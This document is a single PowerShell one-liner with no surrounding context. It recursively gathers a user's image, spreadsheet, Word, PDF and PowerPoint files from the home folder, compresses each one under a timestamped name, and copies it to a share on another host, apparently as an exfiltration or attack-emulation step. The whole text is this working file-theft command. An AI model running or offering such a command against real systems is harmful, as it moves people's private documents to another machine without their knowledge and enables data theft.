powershell  "gci $home -r -i *.gif, *.jpg, *.xls*, *.doc, *.pdf, *.ppt|%{$e=[Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat '%s'));$r=Get-Random -Ma 10000;$o=$_.Name+[string]$e+'-'+[string]$r+'.zip';$o;Compress-Archive -pa $_.FullName -de \\win2012-1160\run\$o}"
